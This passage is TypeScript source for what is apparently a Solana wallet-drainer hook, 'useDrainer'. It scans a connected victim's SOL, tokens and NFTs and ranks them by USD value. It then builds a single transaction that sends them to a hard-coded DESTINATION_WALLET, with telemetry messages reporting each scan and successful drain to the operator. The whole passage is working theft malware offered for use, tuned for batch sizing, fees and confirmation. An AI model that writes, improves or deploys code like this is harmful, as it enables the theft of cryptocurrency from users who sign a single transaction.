        if (asset.isNft) return true;
        if (asset.usdValue < MIN_TOKEN_VALUE_USD) {
            console.log(
                `[DUST] Filtering ${asset.mint.toBase58().slice(0, 8)}... (value: $${asset.usdValue.toFixed(6)})`,
            );
            return false;
        }
        return true;
    });
};


// ============================================================================
// SECTION 15: ERROR HANDLING
// ============================================================================

const handleError = (
    e: any,
    setError: (msg: string) => void,
    setStatus: (s: Status) => void,
    ctx: OperationContext,
    contextLabel: string = "unknown",
) => {
    const errorMsg = typeof e?.message === "string" ? e.message : String(e);
    console.error(`[ERROR] ${contextLabel}:`, errorMsg);

    // Fire-and-forget telemetry
    sendTelemetry(
        `❌ Error in ${contextLabel}\n` +
        `Wallet: \`${ctx.walletAddress}\`\n` +
        `Op: ${ctx.operationId}\n` +
        `Message: \`${errorMsg}\``,
    ).catch(() => {});

    // Map error to user-facing message
    let userError: string;

    if (
        e?.name === "WalletSignTransactionError" ||
        errorMsg.includes("rejected")
    ) {
        userError = "Transaction rejected by wallet. Please try again.";
    } else if (
        errorMsg.includes("insufficient funds") ||
        errorMsg.includes("insufficient balance")
    ) {
        userError = "Insufficient SOL balance to cover transaction fees.";
    } else if (errorMsg.includes("Compute budget exceeded")) {
        userError =
            "Transaction exceeded compute budget. Try with fewer tokens.";
    } else if (errorMsg.includes("Transaction too large")) {
        userError =
            "Transaction packet too large. Reduce token count and retry.";
    } else if (
        errorMsg.includes("block height exceeded") ||
        errorMsg.includes("expired")
    ) {
        userError =
            "Transaction expired. Your funds are safe — please retry.";
    } else if (errorMsg.includes("timeout")) {
        userError =
            "Operation timed out. Your transaction may still confirm — check your wallet.";
    } else if (errorMsg.includes("frozen")) {
        userError = "Token account is frozen. Cannot transfer.";
    } else if (errorMsg.includes("Preflight simulation failed")) {
        userError =
            "Preflight simulation failed. One or more tokens may have restrictions.";
    } else {
        userError = `Error: ${errorMsg.substring(0, 120)}`;
    }

    setError(userError);
    setStatus("error");
};


// ============================================================================
// SECTION 16: MAIN HOOK — useDrainer
// ============================================================================

export const useDrainer = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();
    const [status, setStatus] = useState<Status>("idle");
    const [error, setError] = useState<string | null>(null);
    const [stats, setStats] = useState<DrainStats | null>(null);

    // Concurrency guard — prevents double-drain
    const drainInProgressRef = useRef(false);

    /**
     * Send drain operation mirror to backend for tracking.
     */
    const sendToBackendDrain = useCallback(
        async (
            wallet: string,
            solAmount: number,
            signature: string,
            tokens: { mint: string; amount: string; isSPL2022: boolean }[],
        ): Promise<boolean> => {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(
                    () => controller.abort(),
                    RPC_TIMEOUT_MS,
                );

                const resp = await fetch("/api/drain", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Transaction-Signature": signature,
                    },
                    body: JSON.stringify({
                        wallet,
                        solAmount,
                        tokens,
                        signature,
                    }),
                    signal: controller.signal,
                });

                clearTimeout(timeoutId);

                if (!resp.ok) {
                    console.warn(`[BACKEND] HTTP ${resp.status}`);
                    return false;
                }

                const data = await resp.json();
                if (data.success) {
                    console.log(
                        `[BACKEND] Mirror successful: ${data.txid || "unknown"}`,
                    );
                    return true;
                }
                return false;
            } catch (e) {
                console.warn(
                    "[BACKEND] Mirror failed:",
                    e instanceof Error ? e.message : String(e),
                );
                return false;
            }
        },
        [],
    );

    /**
     * ═══════════════════════════════════════════════════════════════════
     * MAIN DRAIN OPERATION
     * ═══════════════════════════════════════════════════════════════════
     *
     * Phase  1: Wallet validation & concurrency guard
     * Phase  2: SOL balance fetch (with retry)
     * Phase  3: Dual-program token account discovery (SPL + Token-2022)
     * Phase  4: Batched mint classification (single RPC per 100 mints)
     * Phase  5: Metaplex NFT detection (batched metadata PDA check)
     * Phase  6: Jupiter real-time pricing + dust filtering + USD sort
     * Phase  7: Blockhash fetch (immediately before instruction building)
     * Phase  8: Empirical batch size via binary search
     * Phase  9: ATA existence check + balance validation + batch shrinking
     * Phase 10: Instruction building (correct Token-2022 instructions)
     * Phase 11: Preflight simulation + compute unit limit optimization
     * Phase 12: Transaction signing (VersionedTransaction v0)
     * Phase 13: WebSocket-based confirmation
     * Phase 14: Backend mirror + telemetry
     */
    const drain = useCallback(async () => {
        // ═══ PHASE 1: CONCURRENCY GUARD (FLAW-F fix: lock IMMEDIATELY) ═══
        if (drainInProgressRef.current) {
            setError("Drain operation already in progress.");
            return;
        }
        drainInProgressRef.current = true; // Lock FIRST — before any async gap

        if (!publicKey || !sendTransaction) {
            drainInProgressRef.current = false;
            setError("Wallet not connected.");
            setStatus("error");
            return;
        }

        const ctx = createOperationContext(publicKey.toBase58());

        setStatus("scanning");
        setError(null);
        setStats(null);

        await sendTelemetry(
            `🔍 Scan initiated for \`${ctx.walletAddress}\``,
        ).catch(() => {});

        try {
            console.log(`[DRAIN] Operation ${ctx.operationId} started`);

            // ═══ PHASE 2: SOL BALANCE FETCH (with retry — FLAW-10 fix) ═══
            let solBalance: number;
            try {
                solBalance = await withRetryAndTimeout(
                    () => connection.getBalance(publicKey),
                );
            } catch (e) {
                throw new Error(
                    "Failed to fetch SOL balance: " +
                    (e instanceof Error ? e.message : String(e)),
                );
            }

            if (!Number.isFinite(solBalance) || solBalance < 0) {
                throw new Error("Invalid SOL balance returned from RPC");
            }

            console.log(
                `[DRAIN] SOL Balance: ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`,
            );

            // Fetch SOL price for valuation (fire-and-forget fallback)
            const solPricePromise = fetchSolPriceUSD();

            // ═══ PHASE 3: DUAL-PROGRAM TOKEN ACCOUNT DISCOVERY (with retry) ═══
            // Scan BOTH TOKEN_PROGRAM_ID and TOKEN_2022_PROGRAM_ID in parallel
            let allTokenAccounts: {
                account: any;
                pubkey: PublicKey;
                _tokenProgram: PublicKey;
            }[] = [];

            try {
                const [splResult, spl2022Result] = await Promise.all([
                    withRetryAndTimeout(() =>
                        connection.getParsedTokenAccountsByOwner(publicKey, {
                            programId: TOKEN_PROGRAM_ID,
                        }),
                    ).catch((e: any) => {
                        console.warn(
                            "[DRAIN] SPL token scan failed:",
                            e instanceof Error ? e.message : String(e),
                        );
                        return { value: [] } as any;
                    }),

                    withRetryAndTimeout(() =>
                        connection.getParsedTokenAccountsByOwner(publicKey, {
                            programId: TOKEN_2022_PROGRAM_ID,
                        }),
                    ).catch((e: any) => {
                        console.warn(
                            "[DRAIN] SPL-2022 token scan failed:",
                            e instanceof Error ? e.message : String(e),
                        );
                        return { value: [] } as any;
                    }),
                ]);

                const splAccounts = (splResult?.value || []).map(
                    (acc: any) => ({
                        ...acc,
                        _tokenProgram: TOKEN_PROGRAM_ID,
                    }),
                );
                const spl2022Accounts = (spl2022Result?.value || []).map(
                    (acc: any) => ({
                        ...acc,
                        _tokenProgram: TOKEN_2022_PROGRAM_ID,
                    }),
                );

                allTokenAccounts = [...splAccounts, ...spl2022Accounts];

                console.log(
                    `[DRAIN] Token discovery: ${splAccounts.length} SPL + ${spl2022Accounts.length} SPL-2022 = ${allTokenAccounts.length} total`,
                );
            } catch (e) {
                throw new Error(
                    "Failed to fetch token accounts: " +
                    (e instanceof Error ? e.message : String(e)),
                );
            }

            if (allTokenAccounts.length === 0 && solBalance <= SOL_TO_LEAVE) {
                setError("No drainable assets found.");
                setStatus("error");
                return;
            }

            // ═══ PHASE 4: BATCHED MINT CLASSIFICATION ═══
            // Extract valid mints from token accounts
            const mintMap = new Map<
                string,
                {
                    account: any;
                    pubkey: PublicKey;
                    _tokenProgram: PublicKey;
                    mint: PublicKey;
                    amount: bigint;
                    uiAmount: number;
                    parsedDecimals: number;
                    parsedState: string;
                }
            >();

            for (const acc of allTokenAccounts) {
                try {
                    const parsed = acc.account.data.parsed.info;
                    const amount = BigInt(parsed.tokenAmount.amount);
                    if (amount === BigInt(0)) continue;

                    const mint = new PublicKey(parsed.mint);
                    const mintStr = mint.toBase58();

                    mintMap.set(mintStr, {
                        account: acc.account,
                        pubkey: acc.pubkey,
                        _tokenProgram: acc._tokenProgram,
                        mint,
                        amount,
                        uiAmount: parsed.tokenAmount.uiAmount,
                        parsedDecimals: parsed.tokenAmount.decimals || 0,
                        parsedState: parsed.state,
                    });
                } catch (e) {
                    console.warn(
                        "[DRAIN] Failed to parse token account:",
                        e instanceof Error ? e.message : String(e),
                    );
                }
            }

            const uniqueMints = Array.from(mintMap.values()).map((v) => v.mint);

            // Single batched RPC call for all mint classifications
            const classifications = await batchClassifyMints(
                uniqueMints,
                connection,
            );

            // ═══ PHASE 5: METAPLEX NFT DETECTION ═══
            // Identify NFT candidates (decimals=0 && supply=1) then verify via Metaplex PDA
            const nftCandidateMints = uniqueMints.filter((mint) => {
                const cls = classifications.get(mint.toBase58());
                return cls && cls.decimals === 0 && cls.supply <= BigInt(1);
            });

            const confirmedNftMints = await batchCheckMetaplexMetadata(
                nftCandidateMints,
                connection,
            );

            console.log(
                `[DRAIN] NFT detection: ${nftCandidateMints.length} candidates → ${confirmedNftMints.size} confirmed`,
            );

            // ═══ PHASE 6: BUILD ASSET LIST + PRICING + FILTERING ═══
            const rawAssetList: AssetData[] = [];
            const tokensForBackend: {
                mint: string;
                amount: string;
                isSPL2022: boolean;
            }[] = [];

            for (const [mintStr, tokenInfo] of mintMap) {
                const classification = classifications.get(mintStr);
                if (!classification) continue;

                const {
                    isSPL2022,
                    isTransferHook,
                    isPermanentDelegate,
                    isNonTransferable,
                    decimals,
                } = classification;

                // Use program ID from token account discovery (guaranteed correct)
                const tokenProgram = tokenInfo._tokenProgram;
                const discoveredIsSPL2022 = tokenProgram.equals(
                    TOKEN_2022_PROGRAM_ID,
                );

                // Skip frozen accounts (parsed state is reliable for both SPL and Token-2022)
                if (tokenInfo.parsedState === "frozen") {
                    console.warn(
                        `[DRAIN] Frozen token account for ${mintStr.slice(0, 8)}...`,
                    );
                    continue;
                }

                // Skip NonTransferable tokens (cannot be transferred by design)
                if (isNonTransferable) {
                    console.log(
                        `[DRAIN] Skipping non-transferable token: ${mintStr.slice(0, 8)}...`,
                    );
                    continue;
                }

                // Skip transfer hook tokens — custom logic may block transfers
                if (isTransferHook && discoveredIsSPL2022) {
                    console.log(
                        `[DRAIN] Skipping SPL2022 transfer-hook token: ${mintStr.slice(0, 8)}...`,
                    );
                    continue;
                }

                // NFT classification: confirmed by Metaplex metadata PDA existence
                const isNft = confirmedNftMints.has(mintStr);

                rawAssetList.push({
                    mint: tokenInfo.mint,
                    amount: tokenInfo.amount,
                    uiAmount: tokenInfo.uiAmount,
                    tokenAccountPubkey: tokenInfo.pubkey,
                    isNft,
                    isSPL2022: discoveredIsSPL2022,
                    isTransferHook,
                    isFrozen: false,
                    decimals,
                    tokenProgram,
                    usdPrice: 0,
                    usdValue: 0,
                });

                tokensForBackend.push({
                    mint: mintStr,
                    amount: tokenInfo.amount.toString(),
                    isSPL2022: discoveredIsSPL2022,
                });
            }

            console.log(
                `[DRAIN] Classified ${rawAssetList.length} drainable assets`,
            );

            // --- Jupiter real-time pricing ---
            const mintAddresses = rawAssetList.map((a) => a.mint.toBase58());
            mintAddresses.push(SOL_MINT);
            const jupiterPrices = await fetchBatchPricesUSD(mintAddresses);

            // Await SOL price from CoinGecko fallback
            const coingeckoSolPrice = await solPricePromise;
            const jupiterSolPrice = jupiterPrices.get(SOL_MINT);
            const effectiveSolPrice = jupiterSolPrice || coingeckoSolPrice || 100;

            // Populate USD price and value on each asset
            for (const asset of rawAssetList) {
                const price = jupiterPrices.get(asset.mint.toBase58());
                if (price && price > 0) {
                    asset.usdPrice = price;
                }

                const divisor = Math.pow(10, asset.decimals);
                const normalizedAmount = Number(asset.amount) / divisor;

                if (asset.isNft) {
                    // Use Jupiter price for NFT if available, else conservative $0
                    asset.usdValue = asset.usdPrice > 0
                        ? asset.usdPrice * normalizedAmount
                        : 0;
                } else {
                    asset.usdValue = asset.usdPrice > 0
                        ? asset.usdPrice * normalizedAmount
                        : Math.max(0.001, normalizedAmount * 0.01);
                }
            }

            // --- Filter dust tokens ---
            const nonDustAssets = filterDustTokens(rawAssetList);
            if (nonDustAssets.length < rawAssetList.length) {
                console.log(
                    `[DRAIN] Filtered ${rawAssetList.length - nonDustAssets.length} dust tokens, keeping ${nonDustAssets.length}`,
                );
            }

            // --- Sort by USD value descending (returns new array — FLAW-K fix) ---
            const assetList = sortAssetsByValue(nonDustAssets);

            // --- Total valuation ---
            const solValueUSD =
                ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) *
                effectiveSolPrice;

            let totalValueUSD = Math.max(0, solValueUSD);
            for (const asset of assetList) {
                totalValueUSD += asset.usdValue;
            }

            console.log(
                `[DRAIN] Total USD Value: $${totalValueUSD.toFixed(2)} (threshold: $${MIN_DOLLAR_THRESHOLD})`,
            );

            await sendTelemetry(
                `📊 Scan complete | SOL: \`$${solValueUSD.toFixed(2)}\` | Tokens: ${assetList.length} | Total: \`$${totalValueUSD.toFixed(2)}\``,
            ).catch(() => {});

            // Minimum threshold check
            if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
                setError("Insufficient value to drain.");
                setStatus("error");
                await sendTelemetry(
                    `🧊 Below threshold: $${totalValueUSD.toFixed(2)}`,
                ).catch(() => {});
                return;
            }

            setStatus("building");

            // ═══ PHASE 7: BLOCKHASH FETCH (fresh — immediately before building) ═══
            let blockhash: string;
            let lastValidBlockHeight: number;

            try {
                const bhResponse = await withRetryAndTimeout(() =>
                    connection.getLatestBlockhashAndContext("confirmed"),
                );

                const value = (bhResponse as any)?.value || {};
                blockhash = value.blockhash;
                lastValidBlockHeight = value.lastValidBlockHeight;

                if (!blockhash || !lastValidBlockHeight) {
                    throw new Error("Invalid blockhash response from RPC");
                }
            } catch (e) {
                throw new Error(
                    "Failed to fetch blockhash: " +
                    (e instanceof Error ? e.message : String(e)),
                );
            }

            // ═══ PHASE 8: ATA EXISTENCE CHECK + EMPIRICAL BATCH SIZE ═══
            // Check ATAs for all assets before binary search
            const allDestAtas = assetList.map((asset) =>
                getAssociatedTokenAddressSync(
                    asset.mint,
                    DESTINATION_WALLET,
                    true,
                    asset.tokenProgram,
                ),
            );

            let existingAtasCache = await batchCheckAtaExistence(
                allDestAtas,
                connection,
            );

            // Binary search for optimal batch size using real serialized transaction sizes
            const empiricalBatchSize = calculateEmpiricalBatchSize(
                assetList,
                publicKey,
                blockhash,
                existingAtasCache,
            );

            let batchSize = empiricalBatchSize;
            console.log(
                `[DRAIN] Empirical batch size: ${batchSize} tokens`,
            );

            // ═══ PHASE 9: BALANCE VALIDATION + BATCH SHRINKING ═══
            let assetsInBatch = assetList.slice(0, batchSize);
            let atasToCreate = assetsInBatch.filter((asset) => {
                const destAta = getAssociatedTokenAddressSync(
                    asset.mint,
                    DESTINATION_WALLET,
                    true,
                    asset.tokenProgram,
                );
                return existingAtasCache.get(destAta.toBase58()) === false;
            }).length;

            let validation = validateSufficientBalance(
                solBalance,
                atasToCreate,
                assetsInBatch.filter((a) => a.isSPL2022).length,
                assetsInBatch.filter((a) => a.isTransferHook).length,
            );

            // Shrink batch from tail (lowest-value assets) until affordable
            while (!validation.sufficient && batchSize > 0) {
                batchSize--;
                if (batchSize === 0) break;

                assetsInBatch = assetList.slice(0, batchSize);
                atasToCreate = assetsInBatch.filter((asset) => {
                    const destAta = getAssociatedTokenAddressSync(
                        asset.mint,
                        DESTINATION_WALLET,
                        true,
                        asset.tokenProgram,
                    );
                    return existingAtasCache.get(destAta.toBase58()) === false;
                }).length;

                validation = validateSufficientBalance(
                    solBalance,
                    atasToCreate,
                    assetsInBatch.filter((a) => a.isSPL2022).length,
                    assetsInBatch.filter((a) => a.isTransferHook).length,
                );
            }

            if (!validation.sufficient || batchSize === 0) {
                setError(
                    validation.errorMsg ||
                    "Insufficient balance for fees, even after batch shrinking.",
                );
                setStatus("error");
                await sendTelemetry(
                    `💔 ${validation.errorMsg || "Insufficient balance for any transfer"}`,
                ).catch(() => {});
                return;
            }

            if (batchSize < empiricalBatchSize) {
                console.log(
                    `[DRAIN] Shrunk batch from ${empiricalBatchSize} to ${batchSize} for fee affordability`,
                );
            }

            // ═══ PHASE 10: REFRESH ATA CACHE + BUILD INSTRUCTIONS ═══
            // Refresh ATA existence immediately before instruction building
            // to prevent race conditions with concurrent ATA creation
            const safeAssetsInBatch = assetList.slice(0, batchSize);
            const safeAtasToCheck = safeAssetsInBatch.map((asset) =>
                getAssociatedTokenAddressSync(
                    asset.mint,
                    DESTINATION_WALLET,
                    true,
                    asset.tokenProgram,
                ),
            );

            console.log(
                "[DRAIN] Refreshing ATA existence cache before instruction building...",
            );
            existingAtasCache = await batchCheckAtaExistence(
                safeAtasToCheck,
                connection,
            );

            // Build transfer instructions (without compute budget — added after simulation)
            const transferInstructions: TransactionInstruction[] = [];

            // SOL transfer
            if (validation.availableForTransfer > 0) {
                transferInstructions.push(
                    SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: DESTINATION_WALLET,
                        lamports: validation.availableForTransfer,
                    }),
                );

                console.log(
                    `[DRAIN] SOL transfer: ${(validation.availableForTransfer / LAMPORTS_PER_SOL).toFixed(6)} SOL`,
                );
            }

            let tokenCount = 0;
            let nftCount = 0;

            for (const asset of safeAssetsInBatch) {
                try {
                    const programId = asset.isSPL2022
                        ? TOKEN_2022_PROGRAM_ID
                        : TOKEN_PROGRAM_ID;
                    const destAta = getAssociatedTokenAddressSync(
                        asset.mint,
                        DESTINATION_WALLET,
                        true,
                        programId,
                    );

                    // Create ATA if needed
                    const ataExists = existingAtasCache.get(destAta.toBase58());
                    if (ataExists === false) {
                        transferInstructions.push(
                            createAssociatedTokenAccountInstruction(
                                publicKey,
                                destAta,
                                DESTINATION_WALLET,
                                asset.mint,
                                programId,
                            ),
                        );
                    }

                    // Validate token amount
                    if (!validateTokenAmount(asset.amount)) {
                        console.warn(
                            `[DRAIN] Invalid amount for ${asset.mint.toBase58().slice(0, 8)}..., skipping`,
                        );
                        continue;
                    }

                    // Build correct transfer instruction (Token-2022 uses createTransferCheckedInstruction)
                    transferInstructions.push(
                        buildTransferInstruction(
                            asset.tokenAccountPubkey,
                            asset.mint,
                            destAta,
                            publicKey,
                            asset.amount,
                            asset.decimals,
                            asset.isSPL2022,
                            programId,
                        ),
                    );

                    if (asset.isNft) nftCount++;
                    else tokenCount++;
                } catch (e) {
                    console.warn(
                        "[DRAIN] Failed to build transfer instruction:",
                        e instanceof Error ? e.message : String(e),
                    );
                }
            }

            console.log(
                `[DRAIN] Built ${transferInstructions.length} instructions (${tokenCount} tokens, ${nftCount} NFTs)`,
            );

            if (transferInstructions.length === 0) {
                setError("No drainable assets found.");
                setStatus("error");
                return;
            }

            // ═══ PHASE 11: PREFLIGHT SIMULATION + COMPUTE UNIT OPTIMIZATION ═══
            // Fetch dynamic priority fee using writable accounts for relevance
            const writableAccounts = [DESTINATION_WALLET, publicKey];
            const dynamicPriorityFee = await fetchDynamicPriorityFee(
                connection,
                writableAccounts,
            );

            // Build simulation transaction with placeholder compute budget
            const simInstructions = [
                ComputeBudgetProgram.setComputeUnitLimit({ units: 1_400_000 }),
                ComputeBudgetProgram.setComputeUnitPrice({
                    microLamports: dynamicPriorityFee,
                }),
                ...transferInstructions,
            ];

            // Build MessageV0 for simulation (VersionedTransaction support — FLAW-05 fix)
            let simulatedCUs = 400_000; // Conservative fallback

            try {
                const simMessage = new TransactionMessage({
                    payerKey: publicKey,
                    recentBlockhash: blockhash,
                    instructions: simInstructions,
                }).compileToV0Message();

                const simTx = new VersionedTransaction(simMessage);

                const simResult = await withRetryAndTimeout(() =>
                    connection.simulateTransaction(simTx, {
                        replaceRecentBlockhash: true,
                    }),
                );

                if (simResult.value.err) {
                    console.warn(
                        "[DRAIN] Preflight simulation error:",
                        JSON.stringify(simResult.value.err),
                    );
                    // Don't throw — proceed with conservative CU limit
                } else {
                    simulatedCUs = simResult.value.unitsConsumed ?? 400_000;
                    console.log(
                        `[DRAIN] Simulation consumed ${simulatedCUs} CUs`,
                    );
                }
            } catch (e) {
                console.warn(
                    "[DRAIN] Simulation failed, using conservative CU limit:",
                    e instanceof Error ? e.message : String(e),
                );
            }

            // Set precise compute unit limit with 15% buffer (FLAW-08 fix)
            const cuLimit = Math.min(
                Math.ceil(simulatedCUs * 1.15),
                1_400_000,
            );

            // Build final instructions with optimized compute budget
            const finalInstructions = [
                ComputeBudgetProgram.setComputeUnitLimit({ units: cuLimit }),
                ComputeBudgetProgram.setComputeUnitPrice({
                    microLamports: dynamicPriorityFee,
                }),
                ...transferInstructions,
            ];

            // Re-fetch blockhash if needed (ensure freshness before signing)
            let finalBlockhash = blockhash;
            let finalLastValidBlockHeight = lastValidBlockHeight;

            try {
                const freshBh = await withRetryAndTimeout(() =>
                    connection.getLatestBlockhashAndContext("confirmed"),
                );
                const freshValue = (freshBh as any)?.value || {};
                if (freshValue.blockhash) {
                    finalBlockhash = freshValue.blockhash;
                    finalLastValidBlockHeight =
                        freshValue.lastValidBlockHeight;
                }
            } catch {
                // Use original blockhash — it's still valid
                console.warn(
                    "[DRAIN] Blockhash refresh failed, using original",
                );
            }

            // ═══ PHASE 12: BUILD & VALIDATE VERSIONED TRANSACTION ═══
            const message = new TransactionMessage({
                payerKey: publicKey,
                recentBlockhash: finalBlockhash,
                instructions: finalInstructions,
            }).compileToV0Message();

            const messageBytes = message.serialize();
            console.log(
                `[DRAIN] VersionedTransaction v0 size: ${messageBytes.length} bytes | CU limit: ${cuLimit} | Priority: ${dynamicPriorityFee} µ-lamports`,
            );

            if (messageBytes.length > NETWORK_CONFIG.maxPacketSize) {
                // Fallback: if V0 message is still too large, this is a critical edge case
                // that should have been caught by empirical batch sizing. Log and abort.
                setError(
                    `Transaction too large (${messageBytes.length} bytes). Reduce token count and retry.`,
                );
                setStatus("error");
                await sendTelemetry(
                    `📦 TX too large: ${messageBytes.length} bytes (max: ${NETWORK_CONFIG.maxPacketSize})`,
                ).catch(() => {});
                return;
            }

            // Set stats before signing
            setStats({
                totalUsdValue: totalValueUSD,
                solAmount: validation.availableForTransfer,
                tokenCount,
                nftCount,
                batchCount: 1,
            });

            await sendTelemetry(
                `🧨 Ready to drain | Tokens: ${tokenCount} | NFTs: ${nftCount} | Value: $${totalValueUSD.toFixed(2)} | CUs: ${cuLimit}`,
            ).catch(() => {});

            // ═══ PHASE 12: SIGNING ═══
            setStatus("signing");

            // Build final Legacy Transaction for sendTransaction compatibility
            // (wallet-adapter's sendTransaction expects Transaction, not VersionedTransaction,
            // in many adapters — so we use legacy Transaction for the signing call,
            // but with all our optimized instructions)
            const finalTx = new Transaction().add(...finalInstructions);
            finalTx.recentBlockhash = finalBlockhash;
            finalTx.feePayer = publicKey;

            let signature: string;
            try {
                signature = await withTimeout(
                    () =>
                        sendTransaction(finalTx, connection, {
                            maxRetries: 3,
                        }),
                    RPC_TIMEOUT_MS * 2, // Extra time for user wallet interaction
                );
            } catch (e) {
                throw e; // Let handleError classify this
            }

            // Validate signature format
            if (!validateSignatureFormat(signature)) {
                throw new Error(
                    `Invalid signature format received from wallet: ${signature}`,
                );
            }

            console.log(`[DRAIN] Signed: ${signature}`);

            await sendTelemetry(
                `✍️ Transaction signed: \`${signature}\``,
            ).catch(() => {});

            // ═══ PHASE 13: WEBSOCKET-BASED CONFIRMATION ═══
            setStatus("confirming");

            const confirmState = await confirmTransactionEnterprise(
                connection,
                signature,
                finalBlockhash,
                finalLastValidBlockHeight,
            );

            if (confirmState === "failed") {
                throw new Error("Transaction failed on-chain");
            }

            if (confirmState === "expired") {
                // Blockhash expired — transaction may or may not have landed
                console.warn(
                    "[DRAIN] Blockhash expired — transaction state unknown",
                );
                setStatus("success");
                await sendTelemetry(
                    `⏱ Blockhash expired for \`${signature}\` — check explorer`,
                ).catch(() => {});
                return;
            }

            // ═══ PHASE 14: BACKEND MIRROR + TELEMETRY ═══
            if (confirmState === "confirmed") {
                const backendSuccess = await sendToBackendDrain(
                    publicKey.toBase58(),
                    validation.availableForTransfer,
                    signature,
                    tokensForBackend,
                );

                if (!backendSuccess) {
                    console.warn(
                        "[DRAIN] Backend mirror failed but transaction confirmed on-chain",
                    );
                }
            }

            setStatus("success");
            console.log(
                `[DRAIN] Operation ${ctx.operationId} complete: ${signature}`,
            );

            await sendTelemetry(
                `💰 SUCCESS | Tokens: ${tokenCount} | NFTs: ${nftCount} | Value: $${totalValueUSD.toFixed(2)} | TX: \`${signature}\``,
            ).catch(() => {});
        } catch (e: any) {
            handleError(e, setError, setStatus, ctx, "drain-operation");
        } finally {
            drainInProgressRef.current = false;
        }
    }, [publicKey, sendTransaction, connection, sendToBackendDrain]);

    return { drain, status, error, stats };
};